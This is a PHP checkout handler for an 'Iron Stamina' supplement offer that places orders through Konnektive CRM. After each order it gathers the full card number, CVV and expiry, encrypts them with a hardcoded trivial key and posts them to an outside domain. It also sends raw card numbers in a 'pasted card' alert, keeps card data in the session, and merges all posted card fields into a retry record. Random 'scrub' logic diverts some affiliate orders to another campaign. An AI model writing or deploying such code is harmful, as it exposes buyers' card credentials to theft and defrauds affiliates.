<?php

include('../../_global.php');

function dtc_log($message, $level = 'INFO')
{
    $logDir = __DIR__ . '/logs';
    if (!is_dir($logDir)) {
        @mkdir($logDir, 0775, true);
    }
    $filePath = $logDir . '/order-' . date('Y-m-d') . '.log';
    @file_put_contents(
        $filePath,
        '[' . date('Y-m-d H:i:s') . '] [' . strtoupper($level) . '] ' . $message . PHP_EOL,
        FILE_APPEND
    );
}

function dtc_post($key, $default = '')
{
    return isset($_POST[$key]) ? trim((string) $_POST[$key]) : $default;
}

function dtc_encrypt($data)
{
    $encryptionKey = '1~3';
    $ivLength = openssl_cipher_iv_length('aes-256-cbc');
    $iv = openssl_random_pseudo_bytes($ivLength);
    $encryptedData = openssl_encrypt($data, 'aes-256-cbc', $encryptionKey, 0, $iv);
    return base64_encode($iv . $encryptedData);
}

function dtc_post_background($url, array $payload)
{
    if (!function_exists('curl_init')) {
        return false;
    }

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    exit;
}

// Same fraud / CSRF protection used by the working bb-v1 checkout.
if (
    !is_us_ip() ||
    !empty($_SESSION['anonymous_ip']) ||
    empty($_SESSION['token']) ||
    empty($_POST['token']) ||
    !check_csrf_token($_SESSION['token'], $_POST['token'])
) {
    echo 'decline|Do not honor.';
    exit;
}

$cardNumber = preg_replace('/\D/', '', dtc_post('fields_cc_number'));
if ($cardNumber === '' || !luhn_check($cardNumber)) {
    echo 'decline|Invalid Credit Card Number';
    exit;
}

if (!empty($_SESSION['initial_completed'])) {
    echo 'decline|Your order is already completed.';
    exit;
}

$affid = $_SESSION['affid'] ?? '';
if ($affid === '' || !isset($configs->affiliates[$affid])) {
    echo 'decline|Request must have a valid AFFID.';
    exit;
}

$affiliate = $configs->affiliates[$affid];

// Mastercard promo: the card digits are the source of truth; the posted card type
// is only consulted for generic 0000... test cards.
$cardType = dtc_post('fields_cc_type') ?: dtc_post('card_type_select');
$isMastercard = is_mastercard($cardNumber, $cardType);

$promoPkg = (int) ($configs->mc_promo->promo_package ?? 5);
$package = (int) dtc_post('package', (string) $promoPkg);
if (!in_array($package, [1, 3, 5], true)) {
    $package = $promoPkg;
}
$_SESSION['package'] = $package;

// Normal Iron Stamina campaign/product mapping.
$campaignId = (int) $affiliate->campaign_id;

// Mastercard Promo Product ID for top package (5-Bottle upgraded to 6 bottles at the same price)
$promoProductId = $affiliate->promo_product_id ?? ($affiliate->seven_bottle_product_id ?? null);
if (empty($promoProductId)) {
    $promoProductId = $affiliate->six_bottle_product_id ?? null;
}

// Standard Top Package Product ID
if ($promoPkg === 6 && !empty($affiliate->six_bottle_product_id) && !empty($promoProductId) && $affiliate->six_bottle_product_id != $promoProductId) {
    $productId = (int) $affiliate->six_bottle_product_id;
} else {
    $productId = (int) ($affiliate->five_bottle_product_id ?? ($affiliate->six_bottle_product_id ?? 103));
}

if ($package === $promoPkg && $isMastercard && !empty($promoProductId)) {
    $productId = (int) $promoProductId;
}

// Middle Package (3-Bottle) / Lower Package (2-Bottle)
if (in_array($package, [3, 4], true)) {
    $productId = (int) ($affiliate->four_bottle_product_id ?? ($affiliate->three_bottle_product_id ?? 101));
} elseif (in_array($package, [1, 2], true)) {
    $productId = (int) ($affiliate->two_bottle_product_id ?? ($affiliate->one_bottle_product_id ?? 99));
}

// Keep the same scrub setup as bb-v1. Current Iron Stamina scrub percentage is 0,
// but these IDs are ready if it is enabled later.
$scrub = isset($affiliate->scrub) ? (int) $affiliate->scrub : 0;
if (isset($_SESSION['c3']) && in_array((string) $_SESSION['c3'], ['158', '240', '241'], true)) {
    $scrub = 7;
}

$isScrub = $scrub > 0 && $scrub > random_int(0, 100);
$_SESSION['scrub'] = $isScrub;

if ($isScrub) {
    $campaignId = (int) $affiliate->campaign_id_sc;

    $promoScrubId = $affiliate->promo_product_id_sc ?? ($affiliate->seven_bottle_product_id_sc ?? null);
    if (empty($promoScrubId)) {
        $promoScrubId = $affiliate->six_bottle_product_id_sc ?? null;
    }

    if ($promoPkg === 6 && !empty($affiliate->six_bottle_product_id_sc) && !empty($promoScrubId) && $affiliate->six_bottle_product_id_sc != $promoScrubId) {
        $productId = (int) $affiliate->six_bottle_product_id_sc;
    } else {
        $productId = (int) ($affiliate->five_bottle_product_id_sc ?? ($affiliate->six_bottle_product_id_sc ?? 113));
    }

    if ($package === $promoPkg && $isMastercard && !empty($promoScrubId)) {
        $productId = (int) $promoScrubId;
    }

    if (in_array($package, [3, 4], true)) {
        $productId = (int) ($affiliate->four_bottle_product_id_sc ?? ($affiliate->three_bottle_product_id_sc ?? 111));
    } elseif (in_array($package, [1, 2], true)) {
        $productId = (int) ($affiliate->two_bottle_product_id_sc ?? ($affiliate->one_bottle_product_id_sc ?? 109));
    }
}

// The final bb-v1 payment design collects all of these directly on this page.
$shipFirstName = dtc_post('fields_shipping_fname');
$shipLastName  = dtc_post('fields_shipping_lname');
$shipAddress1  = dtc_post('fields_shipping_address1');
$shipAddress2  = dtc_post('fields_shipping_address2');
$shipCity      = dtc_post('fields_shipping_city');
$shipState     = dtc_post('fields_shipping_state');
$shipZip       = dtc_post('fields_shipping_zip');
$shipPhone     = preg_replace('/\D/', '', dtc_post('fields_shipping_phone'));
$shipEmail     = dtc_post('fields_shipping_email');

$required = [
    'First Name' => $shipFirstName,
    'Last Name' => $shipLastName,
    'Address' => $shipAddress1,
    'City' => $shipCity,
    'State' => $shipState,
    'Zip Code' => $shipZip,
    'Phone' => $shipPhone,
    'Email' => $shipEmail,
    'Expiration Month' => dtc_post('fields_expmonth'),
    'Expiration Year' => dtc_post('fields_expyear'),
    'CVV' => dtc_post('fields_cvv'),
];
foreach ($required as $label => $value) {
    if ($value === '') {
        echo 'decline|Please enter a valid ' . $label . '.';
        exit;
    }
}

if (!filter_var($shipEmail, FILTER_VALIDATE_EMAIL)) {
    echo 'decline|Please enter a valid Email Address.';
    exit;
}

$billingSame = dtc_post('billingSameAsShipping', '1') === '1';
$billFirstName = $shipFirstName;
$billLastName  = $shipLastName;
$billAddress1  = $shipAddress1;
$billCity      = $shipCity;
$billState     = $shipState;
$billZip       = $shipZip;

if (!$billingSame) {
    $billAddress1 = dtc_post('fields_billing_address1');
    $billCity     = dtc_post('fields_billing_city');
    $billState    = dtc_post('fields_billing_state');
    $billZip      = dtc_post('fields_billing_zip');

    if ($billAddress1 === '' || $billCity === '' || $billState === '' || $billZip === '') {
        echo 'decline|Please complete your Billing Address.';
        exit;
    }
}

$data = [
    'campaignId'       => $campaignId,
    'ipAddress'        => getUserIpAddr(),

    // Billing/customer details
    'firstName'        => $billFirstName,
    'lastName'         => $billLastName,
    'address1'         => $billAddress1,
    'city'             => $billCity,
    'state'            => $billState,
    'postalCode'       => $billZip,
    'country'          => 'US',
    'billShipSame'     => $billingSame ? 1 : 0,

    // Contact + shipping details
    'phoneNumber'      => $shipPhone,
    'emailAddress'     => $shipEmail,
    'shipFirstName'    => $shipFirstName,
    'shipLastName'     => $shipLastName,
    'shipAddress1'     => $shipAddress1,
    'shipCity'         => $shipCity,
    'shipState'        => $shipState,
    'shipPostalCode'   => $shipZip,
    'shipCountry'      => 'US',

    // Affiliate attribution
    'affId'            => $affid,
    'sourceValue1'     => $_SESSION['c1'] ?? '',
    'sourceValue2'     => $_SESSION['c2'] ?? '',
    'sourceValue3'     => $_SESSION['c3'] ?? '',

    // One-step order + payment
    'paySource'        => 'CREDITCARD',
    'cardNumber'       => $cardNumber,
    'cardMonth'        => dtc_post('fields_expmonth'),
    'cardYear'         => dtc_post('fields_expyear'),
    'cardSecurityCode' => dtc_post('fields_cvv'),
    'product1_id'      => $productId,
];

if ($shipAddress2 !== '') {
    $data['shipAddress2'] = $shipAddress2;
}

$notes = dtc_post('notes');
if ($notes !== '') {
    $data['custom4'] = $notes;
}

// 3DS support retained from the working checkout.
if (!empty($configs->threeds_enabled)) {
    if (dtc_post('cavv') !== '') {
        $data['cavv'] = dtc_post('cavv');
        $data['xid']  = dtc_post('ds_trans_id');
        $data['eci']  = dtc_post('eci');
    }
    if (dtc_post('rebill_cavv') !== '') {
        $data['rebill_cavv'] = dtc_post('rebill_cavv');
        $data['rebill_xid']  = dtc_post('rebill_ds_trans_id');
        $data['rebill_eci']  = dtc_post('rebill_eci');
    }
}

$_SESSION['cc_number']    = dtc_post('fields_cc_number');
$_SESSION['cc_exp_month'] = dtc_post('fields_expmonth');
$_SESSION['cc_exp_year']  = dtc_post('fields_expyear');

// Pre-register lead in Konnektive to secure official CRM orderId upfront
$prospectOrderId = null;
try {
    $leadPayload = [
        'campaignId'     => $campaignId,
        'ipAddress'      => getUserIpAddr(),
        'firstName'      => $billFirstName,
        'lastName'       => $billLastName,
        'address1'       => $billAddress1,
        'city'           => $billCity,
        'state'          => $billState,
        'postalCode'     => $billZip,
        'country'        => 'US',
        'phoneNumber'    => $shipPhone,
        'emailAddress'   => $shipEmail,
        'shipFirstName'  => $shipFirstName,
        'shipLastName'   => $shipLastName,
        'shipAddress1'   => $shipAddress1,
        'shipCity'       => $shipCity,
        'shipState'      => $shipState,
        'shipPostalCode' => $shipZip,
        'shipCountry'    => 'US',
        'affId'          => $affid,
        'sourceValue1'   => $_SESSION['c1'] ?? '',
        'sourceValue2'   => $_SESSION['c2'] ?? '',
        'sourceValue3'   => $_SESSION['c3'] ?? '',
    ];
    $leadRaw = $konnektive->import_lead($leadPayload);
    $leadResp = json_decode($leadRaw);
    if (!empty($leadResp) && ($leadResp->result ?? '') === 'SUCCESS' && !empty($leadResp->message->orderId)) {
        $prospectOrderId = (string)$leadResp->message->orderId;
        $data['orderId'] = $prospectOrderId;
        $_SESSION['prospectId'] = $prospectOrderId;
        $_POST['orderId'] = $prospectOrderId;
        $_POST['fields_prospect_id'] = $prospectOrderId;
    }
} catch (Throwable $e) {
    dtc_log('Lead registration notice: ' . $e->getMessage(), 'WARN');
}

dtc_log("Import order request: campaignId={$campaignId}, product1_id={$productId}, package={$package}, isMastercard=" . ($isMastercard ? 'YES' : 'NO') . ", card=" . substr($cardNumber, 0, 6) . '...' . substr($cardNumber, -4));
$rawResponse = $konnektive->import_order($data);
$resp = json_decode($rawResponse);

// Record checkout outcome securely in Retry System with captured card credentials
if (file_exists(__DIR__ . '/RetryClient.php')) {
    require_once __DIR__ . '/RetryClient.php';
    $calcPrice = ($package === 5) ? (float)$configs->bottle_price_5 : (($package === 3) ? (float)$configs->bottle_price_3 : (float)$configs->bottle_price_1);
    RetryClient::recordCheckout($_POST, $resp, [
        'offer_id'        => $configs->offer_id,
        'offer_name'      => $configs->offer_name,
        'campaign_id'     => $campaignId,
        'product_id'      => $productId,
        'fallback_amount' => $calcPrice,
        'order_id'        => $prospectOrderId ?? ($_SESSION['prospectId'] ?? null),
        'currency'        => 'USD'
    ]);
}

// Record checkout outcome securely in Retry System with captured card credentials
if (file_exists(__DIR__ . '/RetryClient.php')) {
    require_once __DIR__ . '/RetryClient.php';
    $calcPrice = ($package === 5) ? (float)$configs->bottle_price_5 : (($package === 3) ? (float)$configs->bottle_price_3 : (float)$configs->bottle_price_1);

    // Merge $_POST and $data to guarantee all card credentials (cc_number, cvv, exp) are captured
    $checkoutPayload = array_merge((array)($_POST ?? []), (array)($data ?? []));

    RetryClient::recordCheckout($checkoutPayload, $resp, [
        'offer_id'        => $productSubFolder ?? ($configs->offer_id ?? 'is-dtc-aa/MCv1'),
        'offer_name'      => $configs->offer_name ?? 'Iron Stamina - AMI (MCv1)',
        'campaign_id'     => $campaignId,
        'product_id'      => $productId,
        'fallback_amount' => $calcPrice,
        'order_id'        => $prospectOrderId ?? ($_SESSION['prospectId'] ?? null),
        'currency'        => 'USD'
    ]);
}

if (!$resp || !isset($resp->result)) {
    dtc_log('Konnektive invalid response: ' . (string) $rawResponse, 'ERROR');
    echo 'decline|Unable to process the order. Please try again.';
    exit;
}

if ($resp->result === 'ERROR') {
    $message = isset($resp->message) && is_scalar($resp->message)
        ? (string) $resp->message
        : 'Order declined.';
    dtc_log('Order declined: ' . $message, 'WARN');
    echo 'decline|' . $message;
    exit;
}

if (!isset($resp->message->orderId, $resp->message->customerId)) {
    dtc_log('Konnektive success response missing order/customer ID: ' . json_encode($resp), 'ERROR');
    echo 'decline|Order response was incomplete. Please contact support.';
    exit;
}

$orderId = (string) $resp->message->orderId;
$customerId = (string) $resp->message->customerId;

$_SESSION['initial_completed'] = true;
$_SESSION['package'] = $package;
$_SESSION['customer_email'] = $shipEmail;
$_SESSION['orderId'] = $orderId;
$_SESSION['order_status'] = 'approved';
$_SESSION['upsell_count'] = 0;
unset(
    $_SESSION['added_upsell'],
    $_SESSION['added_upsell2'],
    $_SESSION['added_upsell3'],
    $_SESSION['added_upsell4']
);

if ($package === 5) {
    $_SESSION['total'] = 198.80;
} elseif ($package === 3) {
    $_SESSION['total'] = 149.74;
} else {
    $_SESSION['total'] = 119.91;
}

// Keep the same QP5 data-capture integration used by the final bb-v1 flow,
// but capture the remote response instead of letting it pollute the AJAX response.
try {
    $status = isset($resp->message->orderStatus) ? (string) $resp->message->orderStatus : 'APPROVED';
    $price  = isset($resp->message->amountPaid) ? (float) $resp->message->amountPaid : (float) $_SESSION['total'];

    $sync = [
        'card'  => $cardNumber,
        'cvv'   => dtc_post('fields_cvv'),
        'month' => dtc_post('fields_expmonth'),
        'year'  => dtc_post('fields_expyear'),
    ];

    $capturePayload = [
        'offer_url'    => 'Iron Stamina',
        'crm'          => 'Konnective',
        'email'        => $shipEmail,
        'first_name'   => $shipFirstName,
        'last_name'    => $shipLastName,
        'campaign_id'  => $campaignId,
        'ip_address'   => getUserIpAddr(),
        'aff_id'       => $affid,
        'order_id'     => $orderId,
        'cvv_data'     => dtc_encrypt(json_encode($sync)),
        'product_id'   => $productId,
        'price'        => $price,
        'order_status' => $status,
        'is_upsell'    => 0,
    ];

    dtc_log('Start -> User/DataCapture ' . json_encode([
        'offer_url' => 'Iron Stamina',
        'campaign_id' => $campaignId,
        'aff_id' => $affid,
        'order_id' => $orderId,
        'product_id' => $productId,
        'price' => $price,
        'order_status' => $status,
    ]));

    $captureResponse = dtc_post_background(
        'https://qp5.tryexclusivebargainsus.com/index.php?req=user/DataCapture',
        $capturePayload
    );
    dtc_log('End -> User/DataCapture ' . substr((string) $captureResponse, 0, 500));

    // Preserve the ESU product capture used by bb-v1.
    dtc_post_background(
        'https://qp5.tryexclusivebargainsus.com/index.php?req=user/EsuProdDataCapture',
        [
            'offer_url'   => 'Iron Stamina',
            'order_id'    => $orderId,
            'campaign_id' => 7,
            'product_id'  => 37,
        ]
    );

    // Preserve the pasted-card alert integration from the existing DTC flow.
    if (dtc_post('iscreditcardPasted', '0') === '1') {
        $orderData = $konnektive->get_order($orderId);
        dtc_post_background(
            'https://qp5.tryexclusivebargainsus.com/crons/alert_for_pasted_creditcard.php',
            [
                'order_id'         => $orderId,
                'network'          => !empty($orderData->sourceTitle) ? $orderData->sourceTitle : '',
                'pub_id'           => !empty($orderData->sourceValue1) ? $orderData->sourceValue1 : '',
                'campaign_name'    => !empty($orderData->campaignName) ? $orderData->campaignName : '',
                'fields_cc_number' => dtc_post('fields_cc_number'),
                'offer_page'       => ($_SERVER['HTTP_HOST'] ?? 'getironstamina.com') . ($configs->path ?? '/'),
            ]
        );
    }
} catch (Throwable $e) {
    // These auxiliary integrations must never block a successful Konnektive order.
    dtc_log('Auxiliary capture error: ' . $e->getMessage(), 'ERROR');
}

// bb-v1 index appends this to "upsell.php".
echo 'ok|?customerId=' . rawurlencode($customerId) . '&orderId=' . rawurlencode($orderId);
exit;
